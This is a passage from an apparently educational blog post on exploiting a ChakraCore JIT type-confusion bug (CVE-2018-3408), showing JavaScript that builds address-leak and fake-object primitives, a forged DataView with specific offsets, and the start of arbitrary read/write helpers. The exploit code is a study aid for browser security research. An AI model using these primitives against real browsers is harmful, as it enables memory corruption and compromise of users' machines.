&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#a6e22e">__proto__&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">proto&lt;/span>}; &lt;span style="color:#75715e">// [2]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">arr2&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fake_object&lt;/span>; &lt;span style="color:#75715e">// [3]*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>With the introduction of the third parameter, we also need to adjust our code which causes the &lt;code>opt&lt;/code> function to be JITed.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">arr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>, &lt;span style="color:#ae81ff">2.2&lt;/span>, &lt;span style="color:#ae81ff">3.3&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">arr2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.2&lt;/span>, &lt;span style="color:#ae81ff">2.3&lt;/span>, &lt;span style="color:#ae81ff">3.4&lt;/span>]; &lt;span style="color:#75715e">// *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">10000&lt;/span>; &lt;span style="color:#a6e22e">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">opt&lt;/span>(&lt;span style="color:#a6e22e">arr&lt;/span>, {}, &lt;span style="color:#a6e22e">arr2&lt;/span>); &lt;span style="color:#75715e">// *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Having performed the above shown changes, when &lt;code>opt&lt;/code> is JITed, the same conversion happens. However, based on the parameters we passed, JIT will treat the &lt;code>arr&lt;/code> and &lt;code>arr2&lt;/code> parameters to the &lt;code>opt&lt;/code> function as two distinct parameters. Let&amp;rsquo;s now look at the change made to the &lt;code>opt&lt;/code> function call which causes the type confusion.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">opt&lt;/span>(&lt;span style="color:#a6e22e">arr&lt;/span>, &lt;span style="color:#a6e22e">arr&lt;/span>, &lt;span style="color:#a6e22e">arr&lt;/span>); &lt;span style="color:#75715e">// *
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As we can see above, we set the parameter &lt;code>arr2&lt;/code> to the same &lt;code>arr&lt;/code> array. Going back to the last change done to the &lt;code>opt&lt;/code> function, &lt;code>arr2&lt;/code>, which is treated as a separate array from &lt;code>arr&lt;/code>, is converted to a &lt;code>JavascriptVarArray&lt;/code> with the assignment of the second element to the &lt;code>fake_object&lt;/code>. This leaves the &lt;code>arr&lt;/code> parameter with its data not invalidated, and reading from it, will result in a &lt;code>JavascriptNativeFloatArray&lt;/code> read. Thus, if we read the second element, which contains the address of &lt;code>fake_object&lt;/code>, we will be reading it as a non type encoded 64-bit float. Converting this 64-bit float to a 64-bit unsigned integer, would give us a leak of the &lt;code>fake_object&lt;/code> address. In order to get the leak, the following changes can be done to the &lt;code>opt&lt;/code> function.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">f64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Float64Array&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">i32&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Int32Array&lt;/span>(&lt;span style="color:#a6e22e">f64&lt;/span>.&lt;span style="color:#a6e22e">buffer&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">opt&lt;/span>(&lt;span style="color:#a6e22e">arr&lt;/span>, &lt;span style="color:#a6e22e">proto&lt;/span>, &lt;span style="color:#a6e22e">arr2&lt;/span>) { &lt;span style="color:#75715e">//
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">arr&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1.1&lt;/span>; &lt;span style="color:#75715e">// [1]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#a6e22e">__proto__&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">proto&lt;/span>}; &lt;span style="color:#75715e">// [2]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">arr2&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fake_object&lt;/span>; &lt;span style="color:#75715e">// [3]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">arr&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>]; &lt;span style="color:#75715e">// [4]*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">f64&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">addr&lt;/span>; &lt;span style="color:#75715e">// [5]*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">base_lo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">i32&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]; &lt;span style="color:#75715e">// [6]*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">base_hi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">i32&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>]; &lt;span style="color:#75715e">// [7]*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In line &lt;code>[4]&lt;/code> in the above snippet, we read the address of &lt;code>fake_object&lt;/code> into the &lt;code>addr&lt;/code> temporary variable. Note that this extraction into a temporary variable will introduce the type encoding information that is typical of 64-bit floats. This value is then stored once again into a JavascriptNativeFloatArray in line &lt;code>[5]&lt;/code> to remove the type information. The global variable &lt;code>i32&lt;/code> shares the same buffer with the &lt;code>f64&lt;/code> float array. What this allows us to do is to read two 32-bit integers in lines &lt;code>[6]&lt;/code> and &lt;code>[7]&lt;/code> which actually make up the leaked address low and high DWORDs.&lt;/p>
&lt;h3 id="fakeobject-primitive">FakeObject Primitive
&lt;/h3>&lt;p>In the last section, we&amp;rsquo;ve seen how we can leak the address of a JavaScript object; now it&amp;rsquo;s time for us to see if we could create a memory layout which would allow us to corrupt memory. Before jumping into the code, it&amp;rsquo;s crucial to have a basic understanding of what a JavaScript object looks like in memory, as we will use this knowledge to turn the information leak into a memory corruption.&lt;/p>
&lt;p>You might wonder how we can turn this memory leak into something that allows us to compromise the JavaScript engine. Well, it&amp;rsquo;s a not as easy as a simple buffer overflow where you get to control the instruction pointer directly. The bug we have here gives us some capabilities, but we need to do more to turn it into something powerful.&lt;/p>
&lt;p>One of the techniques used in browser exploitation is the creation of a fake object in memory (in short &lt;code>fakeobj&lt;/code>). This gives the ability to control the internal data structure of the fake object we&amp;rsquo;re creating. The fake object primitive can be seen as the counterpart to the info leak primitive, which is also known as the address of primitive (in short &lt;code>addrof&lt;/code>). If the info leak primitive uses this idea to read the pointer to an object in memory, the fake object primitive uses array elements with specifically chosen values to form a valid JavaScript object in memory.&lt;/p>
&lt;p>In our exploit we will be using the fake object primitive to create a fake &lt;code>DataView&lt;/code> object.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">fake_object&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Array(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">opt&lt;/span>(&lt;span style="color:#a6e22e">arr&lt;/span>, &lt;span style="color:#a6e22e">proto&lt;/span>, &lt;span style="color:#a6e22e">arr2&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">arr&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1.1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#a6e22e">__proto__&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">proto&lt;/span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">arr2&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fake_object&lt;/span>; &lt;span style="color:#75715e">// 2.3023e-320;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">arr&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">f64&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">addr&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">base_lo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">i32&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">base_hi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">i32&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">i32&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">base_lo&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x58&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">arr&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">f64&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Type*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">base_lo&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x68&lt;/span>; &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">3&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">base_hi&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// (TypeId for fake Type object)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">4&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>; &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">5&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// (JavascriptLibrary* for fake Type object, +0x430 must be valid memory)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">base_lo&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x58&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x430&lt;/span>; &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">7&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">base_hi&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Buffer size
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">8&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x200&lt;/span>; &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">9&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ArrayBuffer pointer, +0x3C IsDetached
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">10&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">base_lo&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x58&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>; &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">11&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">base_hi&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Buffer address
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">14&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">base_lo&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x58&lt;/span>; &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">15&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">base_hi&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">array_addr_hi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">base_hi&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">array_addr_lo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">base_lo&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Looking at the code snippet above, reveals that there are some changes from the previous section on info leak. These changes in the &lt;code>opt&lt;/code> function are necessary for the fake object primitve and can be seen as the assignments of elements in the &lt;code>fake_object&lt;/code> array. Let&amp;rsquo;s break them down.&lt;/p>
&lt;p>First we have to understand what a &lt;code>DataView&lt;/code> object is. The &lt;a class="link" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView" target="_blank" rel="noopener"
>Mozilla developer website&lt;/a> states that&lt;/p>
&lt;blockquote>
&lt;p>The DataView view provides a low-level interface for reading and writing multiple number types in a binary ArrayBuffer, without having to care about the platform&amp;rsquo;s endianness.&lt;/p>
&lt;/blockquote>
&lt;p>What we can say is that the &lt;code>DataView&lt;/code> allows us to write data to or read data from a buffer. Moreover it&amp;rsquo;s a low-level interface which means it allows us to access the ArrayBuffer&amp;rsquo;s binary buffer. One important note to take here is that this object contains a raw pointer to the binary buffer itself at offset 0x38.&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/blockdiagram.png"
width="1181"
height="962"
srcset="https://execc0de.github.io/posts/cve-2018-3408/blockdiagram_hu10295918747996260197.png 480w, https://execc0de.github.io/posts/cve-2018-3408/blockdiagram_hu11721487343037730599.png 1024w"
loading="lazy"
alt="arr and fake_object block diagram"
class="gallery-image"
data-flex-grow="122"
data-flex-basis="294px"
>&lt;/p>
&lt;p>From the above diagram we can see that the buffer address points to a remote address. By changing the contents of the remote address within a faked &lt;code>DataView&lt;/code> object, we can make use of the inbuilt &lt;code>DataView&lt;/code> methods &lt;code>getInt32&lt;/code> and &lt;code>setInt32&lt;/code> to read from and write to any address we desire.&lt;/p>
&lt;p>Now the most important elements in a &lt;code>DataView&lt;/code> object are the&lt;/p>
&lt;ul>
&lt;li>&lt;code>type&lt;/code> so that JavaScript can identify that it is an &lt;code>DataView&lt;/code>,&lt;/li>
&lt;li>the &lt;code>typeId&lt;/code>,&lt;/li>
&lt;li>a pointer called &lt;code>JavascriptLibrary*&lt;/code> which, for exploitation purpose just needs to valid address,&lt;/li>
&lt;li>the buffer size,&lt;/li>
&lt;li>an ArrayBuffer, which also needs to point to a valid address in order not to crash the JavaScript engine&lt;/li>
&lt;li>the Buffer Address, which is a pointer to an address we want to read from or write to&lt;/li>
&lt;/ul>
&lt;p>From a debugger point of view, this is how our fake &lt;code>DataView&lt;/code> object looks in memory.&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/fakedataview.png"
width="852"
height="387"
srcset="https://execc0de.github.io/posts/cve-2018-3408/fakedataview_hu14160260479981854483.png 480w, https://execc0de.github.io/posts/cve-2018-3408/fakedataview_hu7393384735041994830.png 1024w"
loading="lazy"
alt="Fake DataView object"
class="gallery-image"
data-flex-grow="220"
data-flex-basis="528px"
>&lt;/p>
&lt;p>The following snippet shows an example of how we can use this fake &lt;code>DataView&lt;/code> structure. As we shall see in the next section, the &lt;code>read64&lt;/code> helper function, sets the &lt;code>Buffer Address&lt;/code> element in our fake &lt;code>DataView&lt;/code> object. By using native JavaScript APIs, we are then able to read the data at that address and leak an address within ChakraCore.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">chakra_leak&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">read64&lt;/span>(&lt;span style="color:#a6e22e">array_addr&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Leaked address within chakra: 0x&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">chakra_leak&lt;/span>.&lt;span style="color:#a6e22e">toString&lt;/span>(&lt;span style="color:#ae81ff">16&lt;/span>));
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="create-arbitrary-readwrite-primitive">Create Arbitrary Read/Write Primitive
&lt;/h3>&lt;p>In this section we&amp;rsquo;ll expand on our work to create an arbitrary read and write primitive. Previously, we described how FakeObject helpes us to build the base for arbitrary read/write. Since we were able to fake a &lt;code>DataView&lt;/code> object, we are able to set any memory address as the buffer address of the &lt;code>DataView&lt;/code> and read from or write to it, by using &lt;code>getInt32&lt;/code> or &lt;code>setInt32&lt;/code> respectively. This is illustrated in the image below, where we change the buffer address from it&amp;rsquo;s original address to our chosen address.&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/fakedataview.png"
width="852"
height="387"
srcset="https://execc0de.github.io/posts/cve-2018-3408/fakedataview_hu14160260479981854483.png 480w, https://execc0de.github.io/posts/cve-2018-3408/fakedataview_hu7393384735041994830.png 1024w"
loading="lazy"
alt="Changed buffer address in our fake DataView"
class="gallery-image"
data-flex-grow="220"
data-flex-basis="528px"
>&lt;/p>
&lt;p>Since we will be repeatedly reading and writing memory, it makes sense for us to create helper functions which set the buffer address and read from/write to the address. Let&amp;rsquo;s start with the code that will handle reading from memory.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">UnsignedDwordToSignedDword&lt;/span>(&lt;span style="color:#a6e22e">ud&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#a6e22e">ud&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x80000000&lt;/span>) &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#f92672">-&lt;/span>(&lt;span style="color:#ae81ff">0x100000000&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#a6e22e">ud&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">ud&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">SignedDwordToUnsignedDword&lt;/span>(&lt;span style="color:#a6e22e">sd&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#a6e22e">sd&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#a6e22e">sd&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x100000000&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">sd&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">read32&lt;/span>(&lt;span style="color:#a6e22e">addr&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">14&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UnsignedDwordToSignedDword&lt;/span>(&lt;span style="color:#a6e22e">addr&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFF&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">15&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UnsignedDwordToSignedDword&lt;/span>((&lt;span style="color:#a6e22e">addr&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">0x100000000&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFF&lt;/span>);
